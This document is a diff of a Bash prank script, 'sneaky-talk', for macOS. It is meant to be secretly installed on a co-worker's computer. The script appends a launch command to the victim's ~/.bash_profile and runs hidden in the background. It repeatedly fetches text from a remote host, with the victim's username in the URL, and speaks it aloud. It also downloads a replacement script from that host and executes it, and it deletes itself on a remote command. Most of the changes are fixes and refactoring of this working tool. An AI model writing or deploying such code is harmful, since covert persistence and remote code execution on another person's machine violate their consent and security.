@@ -2,25 +2,27 @@
 # On a random interval, download and speak the contents of a file if that file has changed.
 # THe file is spoken using the OSX say command.
 # This script is also updated and relaunched, if an online copy is different from the running copy.
-# Note: IF you change this local script and run it, your changes may be overwritten by the online copy!
+# Note: IF you change this local script and run it, your changes may be overwritten by an older online copy!
 
 # Variables, you may want to adjust:
 # Enable debug output, usually commented out / not set
 # THere is also a -d option to enable debugging on the command-line.
 #debug='1'
 # Version of this script
-script_version='1.2.2'
+script_version='1.2.4'
 # Where the text file to speak and other temporary files will go
 temp_dir="/tmp"
 # Say-file - Name of the file to speak, should be in $temp_dir.
 sayfile_name="${temp_dir}/say.txt"
+# A variable to use with sayfile_url and update_url below.
+sneakytalk_host="sneakytalk" # will depend on local DNS search domain to resolve
 # Full URL to fetch the say-file, including file name.
 # This URL is passed to curl, so can be HTTP, FTP, NFS, Etc.
 # Including the output of the whois command, sets the file name to the user-name running this script.
-sayfile_url="http://ivanfetch.com/sneaky-talk/`whoami`.txt"
+sayfile_url="http://${sneakytalk_host}/sneaky-talk/`whoami`.txt"
 # URL to fetch new versions of this script
 # IF this is not set, the script will not be auto-updated.
-#script_url='http://ivanfetch.com/sneaky-talk/sneaky-talk'
+update_url="http://${sneakytalk_host}/sneaky-talk/sneaky-talk"
 # Self-destruct string - IF the say-file contains only this string, this script will delete itself.
 selfdestruct_string="I am retiring, goodbye."
 # Options to the curl command, not including the output file.
@@ -28,9 +30,9 @@ selfdestruct_string="I am retiring, goodbye."
 curl_options="-s -f"
 # Options to pass to the say command, useful if you want to set the voice or rate.
 say_options='-v Vicki'
-# The command to be placed in a shell initialization file, if the -i (install) command-line option is usednstall_location.
+# The command to be placed in a shell initialization file, if the -i (install) command-line option is used.
 # THis command should fail gracefully if the script no longer exists (if it was self-destructed).
-# Get the full path to $0, in case the script was run with a relative path like ./scriptName
+# First get the full path to $0, in case the script was run with a relative path like ./scriptName
 oldpwd=`pwd`
 relative_dir=`dirname $0`
 cd "$relative_Dir"
@@ -38,11 +40,16 @@ full_script_path="`pwd`/`basename $0`"
 cd "$oldpwd"
 unset oldpwd
 unset relative_dir
-install_cmd="if [ -r /users/ifetch/sneaky-talk ] && /users/ifetch/sneaky-talk -r ; then /users/ifetch/sneaky-talk -d ; fi"
-# A comment which will preceed $install_cmd. This should be somewhat helpful to the user.
+install_cmd="if [ -r /users/ifetch/sneaky-talk ] && /users/ifetch/sneaky-talk -r
+then
+/users/ifetch/sneaky-talk&
+fi"
+# A comment which will proceed $install_cmd. This should be somewhat helpful to the user.
 install_comment='# This was added by a co-worker with access to your computer:'
-# THe location, where $install_cmd should be written.
+# THe location; shell initialization file, where $install_cmd should be written.
+# The ls command is used here to dereference ~
 install_location=`ls -d ~/.bash_profile`
+# End of variables, you may want to adjust:
 
 
 # ##### functions #####
@@ -76,51 +83,13 @@ debug=1
 h)
 # DIsplay help
 debug "Displaying help screen..."
-cat <<EOF
-On a random interval, download and speak the contents of a file if that file has changed.
-THe file is spoken using the Apple OSX say command.
-This script is also updated and relaunched, if an online copy is different from the running copy.
-
-
-
-Usage: $0 [options]
--h - DIsplay this help screen.
--d - Run in debug mode; output progress info.
--i -- Install this script by adding a line to ${install_location}. The line which will be added is:
-$install_cmd
-
--r - Return true if it is ok for this script to run. THis is useful for use in shell conditionals, in shel linitialization files. This optoin returns true, if this script is _not_ already running.
-
-
-THere are variables you may want to adjust (see the section at the top of this script ($0). Here are the current values of these variables:
-
-temp_dir, where the text file to speak and other temporary files will go - $temp_dir
-
-sayfile_name, name of the file to speak, should be in $temp_dir - $sayfile_name
-
-sayfile_url, full URL to fetch the say-file, including file name - $sayfile_url
-
-script_url, URL to fetch new versions of this script (if not set, script will not auto-update) - $script_url
-
-selfdestruct_string, self-destruct string - IF the say-file contains only this string, this script will delete itself - $selfdestruct_string
-
-install_cmd, the command to be placed in a shell inintialization file, if the -i (install) command-line option is used - $install_cmd
-
-install_comment, a comment to be placed above install_cmd (so the user knows how their shel linitialization file got edited) - $install_comment
-
-install_location, the shell initialization file to place install_cmd - $install_location
-
-curl_options, options to pass to the curl command - $curl_options
-
-say_options, options to pass to the say command (useful to set the voice or speech rate) - $say_options
-
-EOF
+display_help
 exit
 ;;
 r)
 # Return true if it is ok to run this script (meaning it is not already running).
 # THIs is used in shell conditionals, in shell initialization files.
-debug "Determining whether it is ok to run this script..."
+debug "Determining whether it is ok to run this script.., or if it is already running."
 if script_already_running
 then
 debug "Script already running, returning false."
@@ -136,9 +105,59 @@ esac
 done
 } # process_options
 
+function display_help {
+# Display help / usage info.
+
+cat <<EOF
+On a random interval, download and speak the contents of a file if that file has changed.
+THe file is spoken using the Apple OSX say command.
+This script is also updated and relaunched, if an online copy is different from the running copy.
+
+Before using this script, look at the variables at the top of this script, at least sneakytalk_host.
+
+Usage: $0 [options]
+
+-h - DIsplay this help screen.
+-d - Run in debug mode; output progress info.
+-i -- Install this script by adding lines to ${install_location}. The lines which will be added is:
+$install_comment
+$install_cmd
+
+-r - Return true if it is ok for this script to run. THis is useful for use in shell conditionals, in shel linitialization files. This option returns true, if this script is _not_ already running.
+
+
+THere are variables you may want to adjust (see the section at the top of this script ($0). Here are the current values of these variables:
+
+temp_dir, where the text file to speak and other temporary files will go - $temp_dir
+
+sayfile_name, name of the file to speak, should be in $temp_dir - $sayfile_name
+
+sneakytalk_host, The host name used in sayfile_url and update_url below. THis makes pointing this script to a different web server a bit easier - $sneakytalk_host
+
+sayfile_url, full URL to fetch the say-file, including file name - $sayfile_url
+
+update_url, URL to fetch new versions of this script (if not set, script will not auto-update) - $update_url
+
+selfdestruct_string, self-destruct string - IF the say-file contains only this string, this script will delete itself - $selfdestruct_string
+
+install_cmd, the command to be placed in a shell inintialization file, if the -i (install) command-line option is used - $install_cmd
+
+install_comment, a comment to be placed above install_cmd (so the user knows how their shel linitialization file got edited) - $install_comment
+
+install_location, the shell initialization file to place install_cmd - $install_location
+
+curl_options, options to pass to the curl command - $curl_options
+
+say_options, options to pass to the say command (useful to set the voice or speech rate) - $say_options
+
+EOF
+} # display_help
+
+
 function script_already_running {
 # Return true if this script is already running.
 debug "Looking for this script in ps output."
+# WE probably should not assume the shell is bash, although this is the OSX default.
 ps -ax -o pid -o args |grep "bash $0" | grep -iv "$$"|grep -iv grep >/dev/null 2>&1
 if [ $? -eq 0 ]
 then
@@ -149,6 +168,7 @@ debug "Not found in process table, returning false"
 return 1
 fi
 } # script_already_running
+
 
 function random_sleep {
 # SLeep a random number of seconds, at least a minute., max 6 minutes
@@ -191,16 +211,24 @@ fi
 
 
 function update_script {
-# IF $script_url is not set, no point in updating.
+# Update this script if the online copy is different.
+# IF $update_url is not set, no point in updating.
 if [ "x${update_url}" == "x" ]
 then
 debug "Not attempting to update this script, as the update_url variable is not set."
 else
 # UPdate the script from an online copy, if a different version is available.
 local temp_file=${temp_dir}/`basename $0`
+# IF $temp_file exists, remove it to avoid running something which someone else placed there.
+if [ -r $temp_file ]
+then
+debug "$temp_file already exists, removing it before downloading script update."
+rm -f $temp_file >/dev/null
+fi
+
 debug "Determining whether the script has been updated online."
 # FIrst download the script to $temp_file
-get_file ${script_url} ${temp_file}
+get_file ${update_url} ${temp_file}
 
 # IF we have a file, then compare it to the running script.
 if [ -r $temp_file ]
@@ -210,10 +238,12 @@ diff $0 $temp_file >/dev/null
 if [ $? -eq 0 ]
 then
 debug "The script has not changed from the online version."
+rm -f $temp_file >/dev/null
 else
 debug "THe script has changed from the online version."
 debug "Copying $temp_file to $0 and re-running $0. . ."
 cp -f $temp_file $0 >/dev/null
+rm -f $temp_file
 # Exec keeps the current process ID.
 exec $0
 fi
@@ -223,7 +253,8 @@ debug "Perhaps the download failed, there is no file $temp_file"
 debug "The script will not be updated."
 fi
 fi
-} # script_changed
+} # update_script
+
 
 function get_file {
 # Download a file using curl.
@@ -234,13 +265,13 @@ debug "Downloading from URL ${url}, to file ${save_file}"
 # Combine the curl options, with the rest of our curl command-line.
 local full_curl_options="${curl_options} -o ${save_file} ${url}"
 debug "Running curl with options: ${full_curl_options}"
-curl ${full_curl_options}
+curl ${full_curl_options} >/dev/null 2>&1
 } # get_file
 
 
 function install_script {
-# Install this script by placing a line in ~/.bash_profile.
-debug "Going to install $full_script_path in $install_location."
+# Install this script by placing a line in $install_location.
+debug "Going to install commands to run $full_script_path in $install_location."
 
 # FIrst see whether there is already a line in bash_profile
 debug "Looking for this install_cmd in $install_location: $install_cmd"
@@ -254,7 +285,7 @@ debug "$matched_install_cmd"
 debug "Not adding an installation command."
 echo "A command to run this script appears to already be installed in $install_location - doing nothing."
 else
-# No line in bash_profile, add one.
+# No line in $install_location, add one.
 debug "No installation command in $install_location - adding one."
 # Backup the $install_location just in case.
 local backup_install_location="${install_location}.pre_`basename $0`.$$"
@@ -266,7 +297,8 @@ echo "Backup of $install_location failed - aborting."
 exit 1
 else
 # Add the install command to $install_location
-debug "Adding this command to $install_location:"
+debug "Adding this to $install_location:"
+debug "$install_comment"
 debug "$install_cmd"
 # Add a newline to $install_location first, in case there is no newline on the last line of that file.
 echo >> $install_location
@@ -277,28 +309,30 @@ echo "$install_cmd" >>$install_location
 # Add a blank line after, too.
 echo >> $install_location
 echo "$full_script_path has been installed to $install_location. THe file $install_location has been backed up to $backup_install_location before editing."
-echo "Running `basename $0` in the background now. YOu should probably clear this terminal window."
+echo "Running `basename $0` in the background now. You should probably clear or close this terminal window."
 
 # GO ahead and run the script now.
 # IF we are debugging, continue debugging and run in the foreground
 if [ $debug ]
 then
 debug "Running this script in the foreground with debugging enabled"
-sleep 1 && $full_script_path -d
+sleep 1
+$full_script_path -d
 else
 # NOt debugging, run the script in the background.
-# SLeep a second to give this copy of the script time to exit, otherwise the below invocation will fail to run.
-#sleep 1 && $full_script_path >/dev/null 2>&1 &
 exec "$full_script_path" >/dev/null 2>&1 &
 fi # not debugging, run script
 fi # cp succeeded
 fi # added an install cmd
 exit
-
 } # install_script
+
+
+
 # ##### Main Script #####
+
 # PRocess command-line options.
-# YOu have to pass $* to this function otherwise it will not see the options
+# You have to pass $@ to this function otherwise it will not see the options
 process_options $@
 
 debug "`basename $0`, version $script_version"
@@ -325,6 +359,8 @@ while (true)
 do
 # Update the script if a different copy is online.
 update_script
+
+# Download the file to be spoken.
 debug "Downloading say-file."
 get_file ${sayfile_url} ${sayfile_name}
 
@@ -332,20 +368,20 @@ get_file ${sayfile_url} ${sayfile_name}
 if [ "`cat ${sayfile_name}`" == "${selfdestruct_string}" ]
 then
 debug "Say-file contains self-destruct string. Deleting the say-file and this script, $0"
-rm $sayfile_name
+rm -f $sayfile_name >/dev/null
 # Perhaps copy the script to $temp_dir first, just in case we end up deleting something we shouldn't
 cp $0 ${temp_dir}
-rm $0
+rm -f $0 >/dev/null
 exit
 fi
 
-# IF the contents of the say-file has changed, speak it's contents.
+# If the contents of the say-file has changed, speak it's contents.
 if sayfile_changed ${sayfile_name}
 then
 debug "Speaking contents of ${sayfile_name}: `cat ${sayfile_name}`"
 say $say_options -f ${sayfile_name}
 else
-debug "I've got nothing to say, yet..."
+debug "The file has not changed, I've got nothing to say, yet..."
 fi
 # Sleep again before the loop repeats.
 random_sleep
